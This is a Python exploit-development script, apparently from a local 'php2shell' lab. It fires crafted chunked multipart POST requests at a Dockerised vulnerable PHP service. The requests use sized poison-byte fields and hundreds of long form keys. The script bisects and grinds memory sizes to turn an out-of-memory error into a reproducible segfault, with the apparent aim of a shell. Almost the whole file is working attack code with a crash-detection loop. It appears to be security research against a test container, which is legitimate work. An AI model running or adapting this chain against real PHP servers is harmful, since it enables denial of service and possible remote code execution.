#!/usr/bin/env python3
"""php2shell lab, oom26: bisect the boundary, grind the key band.

oom25 bracketed the regime edge in rem-space: 1,578,560 (value death,
alloc=135168 = fill hit wall during key-run prep) .. 1,840,704 (survive).
The key-death band (pool 19,034..19,362B at element-513 resize) sits
somewhere inside. rem <-> pool slope ~2 (double buffering): band width
328B -> rem window ~164B, boot jitter smears it ~KBs.

Stage A: bisect boundary between value-death and survive (12 boots),
         stopping at 1KB resolution.
Stage B: grind midpoints +-8KB in 256B steps... 64 boots budget, stopping
         on alloc<=600 (KEY DEATH -> segv check).
Both stages: docker restart per boot; segfault grep on every hit.
"""
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

NKEYS = 400
V = 64

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 466 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(NKEYS):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=180)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "150"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def boot_rem(port, rem, log):
    restart()
    fatal, text = send(port, build(rem))
    a = alloc_n(text) if fatal else None
    if fatal:
        if a is not None and a <= 600:
            log(f"rem={rem}: fatal alloc={a}  *** KEY DEATH — SEGFAULT CHECK ***")
            time.sleep(1.5)
            hits = segcheck()
            for h in hits:
                log("SEGV: " + h)
            if hits:
                log("*** SEGFAULT REPRODUCED — chain complete ***")
                return "segv"
            return "key"
        return f"fatal{a}"
    return "ok"

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081

    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)

    lo, hi = 1_578_560, 1_840_704   # lo=fatal(value), hi=survive
    # Stage A: bisect
    for i in range(12):
        mid = (lo + hi) // 2
        r = boot_rem(port, mid, log)
        if r == "segv":
            return
        if r == "ok":
            hi = mid
        else:
            lo = mid
        log(f"bisect{i}: rem={mid} -> {r}  window=[{lo},{hi}] width={hi-lo}")
        if hi - lo <= 1024:
            break
    # Stage B: grind across boundary in 256B steps, +-12KB
    center = (lo + hi) // 2
    log(f"=== grind stage, center={center} ===")
    offs = list(range(0, 12288, 256))
    seq = []
    for o in offs:
        seq += [center + o, center - o]
    for rem in seq:
        r = boot_rem(port, rem, log)
        if r == "segv":
            return
    log("== oom26 done ==")

if __name__ == "__main__":
    main()
